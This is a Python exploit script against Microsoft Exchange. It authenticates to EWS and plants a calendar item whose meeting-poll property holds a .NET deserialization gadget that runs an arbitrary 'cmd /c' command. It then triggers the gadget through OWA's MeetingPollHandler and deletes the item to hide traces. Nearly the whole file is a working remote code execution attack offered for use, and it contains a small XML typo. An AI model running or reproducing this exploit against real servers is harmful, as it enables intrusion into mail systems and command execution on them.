import requests
import time
import sys
from base64 import b64encode
from requests_ntlm2 import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
from urllib import quote_plus

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

target = ""
username = "john"
pwd = ""
cmd = "mspaint.exe"


def escape(_str):
    _str = _str.replace("&", "&amp;")
    _str = _str.replace("<", "&lt;")
    _str = _str.replace(">", "&gt;")
    _str = _str.replace("\"", "&quot;")
    return _str


payload2 = """
<ArrayOfKeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC z:Id="1" z:Size="1"
    xmlns="http://schemas.microsoft.com/2003/10/Serialization/Arrays"
    xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/">
    <KeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC>
        <Key z:Id="2">ahihi</Key>
        <Value z:Id="3"
            xmlns:a="http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel.Calendaring.CustomActions">
            <ChangedProperties xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel"
                xmlns:b="http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel.PropertyBags">
                <b:propertyValues z:Size="1"
                    xmlns:c="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
                    <c:KeyValueOfstringanyType>
                        <c:Key>asdasdasdasdasd</c:Key>
                        <c:Value">
                            <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns="http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"
                                                         xmlns:c="http://www.w3.org/2001/XMLSchema"
                                                         xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
                                                         xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/"
                                                         >
                            <root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
                              <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns="http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"
                                                                                  xmlns:c="http://www.w3.org/2001/XMLSchema"
                                                                                  xmlns:i="http://www.w3.org/2001/XMLSchema-instance"
                                                                                  xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/"
                                                                                  >
                                <ExpandedElement z:Id="ref1" >
                                  <__identity i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System"/>
                                </ExpandedElement>
                                <ProjectedProperty0 xmlns:a="http://schemas.datacontract.org/2004/07/System.Windows.Data">
                                  <a:MethodName>Start</a:MethodName>
                                  <a:MethodParameters xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
                                    <b:anyType i:type="c:string">cmd</b:anyType>
                                    <b:anyType i:type="c:string">/c %s</b:anyType>
                                  </a:MethodParameters>
                                  <a:ObjectInstance z:Ref="ref1"/>
                                </ProjectedProperty0>
                              </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
                          </root>
                        </c:Value>
                    </c:KeyValueOfstringanyType>
                </b:propertyValues>
            </ChangedProperties>
            <OriginalTypeAssembly z:Id="12" i:nil="true"
                xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel">Microsoft.Exchange.Entities.DataModel, Version=15.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</OriginalTypeAssembly>
            <OriginalTypeName z:Id="14"
                xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel">Microsoft.Exchange.Entities.DataModel.Calendaring.CustomActions.ProposeOptionsMeetingPollParameters</OriginalTypeName>
        </Value>
    </KeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC>
</ArrayOfKeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC>""" % escape(
    cmd)
payload2 = escape(payload2)
payload1 = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:TimeZoneContext>
      <t:TimeZoneDefinition Name="(UTC-08:00) Pacific Time (US &amp;amp; Canada)" Id="Pacific Standard Time">
        <t:Periods>
          <t:Period Bias="P0DT8H0M0.0S" Name="Standard" Id="Std" />
          <t:Period Bias="P0DT7H0M0.0S" Name="Daylight" Id="Dlt/1" />
          <t:Period Bias="P0DT7H0M0.0S" Name="Daylight" Id="Dlt/2007" />
        </t:Periods>
        <t:TransitionsGroups>
          <t:TransitionsGroup Id="0">
            <t:RecurringDayTransition>
              <t:To Kind="Period">Dlt/1</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>4</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>1</t:Occurrence>
            </t:RecurringDayTransition>
            <t:RecurringDayTransition>
              <t:To Kind="Period">Std</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>10</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>-1</t:Occurrence>
            </t:RecurringDayTransition>
          </t:TransitionsGroup>
          <t:TransitionsGroup Id="1">
            <t:RecurringDayTransition>
              <t:To Kind="Period">Dlt/2007</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>3</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>2</t:Occurrence>
            </t:RecurringDayTransition>
            <t:RecurringDayTransition>
              <t:To Kind="Period">Std</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>11</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>1</t:Occurrence>
            </t:RecurringDayTransition>
          </t:TransitionsGroup>
        </t:TransitionsGroups>
        <t:Transitions>
          <t:Transition>
            <t:To Kind="Group">0</t:To>
          </t:Transition>
          <t:AbsoluteDateTransition>
            <t:To Kind="Group">1</t:To>
            <t:DateTime>2007-01-01T08:00:00.000Z</t:DateTime>
          </t:AbsoluteDateTransition>
        </t:Transitions>
      </t:TimeZoneDefinition>
    </t:TimeZoneContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem SendMeetingInvitations="SendToAllAndSaveCopy">
      <m:Items>
        <t:CalendarItem>
          <t:Subject>Weekly Update Meeting</t:Subject>
			<t:ExtendedProperty>
			<t:ExtendedFieldURI PropertySetId="11000e07-b51b-40d6-af21-caa85edab1d0"
			              PropertyName="MeetingPollProposeOptionsRequestsBlob" PropertyType="String" />
			            <t:Value>%s</t:Value>
			</t:ExtendedProperty>
          <t:Body BodyType="HTML">Come hear about how the Organized Observational Paradigm SkyNet project is coming along!</t:Body>
          <t:ReminderMinutesBeforeStart>30</t:ReminderMinutesBeforeStart>
          <t:Start>2021-04-22T06:45:32.868-08:00</t:Start>
          <t:End>2021-04-22T06:55:32.868-08:00</t:End>
          <t:Location>Contoso Main Gallery</t:Location>
          <t:RequiredAttendees>
            <t:Attendee>
              <t:Mailbox>
                <t:EmailAddress>Administrator@evil.corp</t:EmailAddress>
              </t:Mailbox>
            </t:Attendee>
            <t:Attendee>
              <t:Mailbox>
                <t:EmailAddress>john@evil.corp</t:EmailAddress>
              </t:Mailbox>
            </t:Attendee>
            <t:Attendee>
              <t:Mailbox>
                <t:EmailAddress>mart@evil.corp</t:EmailAddress>
              </t:Mailbox>
            </t:Attendee>
          </t:RequiredAttendees>
          <t:Recurrence>
            <t:DailyRecurrence>
              <t:Interval>1</t:Interval>
            </t:DailyRecurrence>
            <t:NumberedRecurrence>
              <t:StartDate>2021-04-22T06:45:32.868-08:00</t:StartDate>
              <t:NumberOfOccurrences>2</t:NumberOfOccurrences>
            </t:NumberedRecurrence>
          </t:Recurrence>
        </t:CalendarItem>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>
""" % payload2

res = requests.post("https://%s/ews/Exchange.asmx" % target,
                    data=payload1,
                    headers={
                        "Content-type": "text/xml; charset=utf-8",
                    },
                    verify=False,
                    auth=HttpNtlmAuth('%s' % (username), pwd))

if res.status_code != 200:
    print("error 1")
    exit()
ct = res.content
item_id = ct.split('<t:ItemId Id="')[1].split('"')[0]
change_key = ct.split('ChangeKey="')[1].split('"')[0]
print "Attacking target %s with user %s" % (target, username)

print "Sending command cmd.exe /c %s" % cmd
session = requests.Session()
header = {"Cookie": "mkt=en-US"}

data = {
    "destination": "https://%s/owa" % target,
    "flags": "",
    "username": username,
    "password": pwd
}

res = session.post("https://%s/owa/auth.owa" % target,
                   headers=header,
                   data=data,
                   verify=False)
# print(res.status_code)
# print(res.headers)
cookie_obj = requests.cookies.create_cookie(domain=target,
                                            name="mkt",
                                            value="en-US")
session.cookies.set_cookie(cookie_obj)
owa_canary = session.cookies.get_dict()['X-OWA-CANARY']

r1 = session.post(
    "https://%s/owa/lang.owa" % target,
    data=
    "destination=%2Fowa%2F%3FbO%3D1&localeName=en-US&tzid=SE+Asia+Standard+Time&saveLanguageAndTimezone=1&X-OWA-CANARY="
    + owa_canary,
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    verify=False,
    allow_redirects=False)

r2 = session.get(
    "https://%s/owa/MeetingPollHandler.ashx?PayloadType=ApproveProposedOptions&ItemId=OID.%s.2021/04/22&RequestId=123123123"
    % (target, quote_plus(item_id)),
    verify=False,
    allow_redirects=False)

print "Attack successful!"

print "Cleaning up ..."

req_del = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:TimeZoneContext>
      <t:TimeZoneDefinition Id="Pacific Standard Time" />
    </t:TimeZoneContext>
  </soap:Header>
  <soap:Body>
    <m:DeleteItem DeleteType="MoveToDeletedItems" SendMeetingCancellations="SendToAllAndSaveCopy">
      <m:ItemIds>
        <t:ItemId Id="%s" ChangeKey="%s" />
      </m:ItemIds>
    </m:DeleteItem>
  </soap:Body>
</soap:Envelope>""" % (item_id, change_key)

res = requests.post("https://%s/ews/Exchange.asmx" % target,
                    data=req_del,
                    headers={
                        "Content-type": "text/xml; charset=utf-8",
                    },
                    verify=False,
                    auth=HttpNtlmAuth('%s' % (username), pwd))
